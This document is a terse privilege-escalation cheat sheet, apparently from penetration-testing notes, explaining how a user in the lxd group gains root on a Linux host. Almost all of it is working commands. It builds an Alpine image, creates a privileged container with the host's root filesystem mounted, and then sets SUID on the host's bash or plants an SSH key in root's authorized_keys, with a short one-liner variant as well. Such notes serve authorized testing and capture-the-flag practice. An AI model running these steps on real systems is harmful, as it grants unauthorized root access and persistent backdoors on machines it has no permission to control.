# LXD Group Container Escape

User in `lxd` group can mount the host filesystem into a privileged container.

**On attacker machine — build Alpine image:**
```bash
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder && ./build-alpine
# produces alpine-v3.xx-x86_64-<date>.tar.gz
```

**On target:**
```bash
lxc image import alpine-v3.xx.tar.gz --alias pwn-image
lxd init   # accept defaults if first run

lxc init pwn-image pwn-container -c security.privileged=true
lxc config device add pwn-container host-root disk source=/ path=/mnt/root
lxc start pwn-container
lxc exec pwn-container /bin/sh
```

Inside container, host filesystem is at `/mnt/root`:
```bash
chmod u+s /mnt/root/bin/bash   # set SUID on host bash
# OR: write SSH key to /mnt/root/root/.ssh/authorized_keys
```

Exit container, then on host:
```bash
bash -p   # euid=0 if SUID bash
```

**One-liner alternative (m0noc):**
```bash
lxc image import bob.tar.bz2 --alias bobImage
lxc init bobImage bobVM -c security.privileged=true
lxc config device add bobVM realRoot disk source=/ path=r
lxc start bobVM && lxc exec bobVM /bin/sh
```
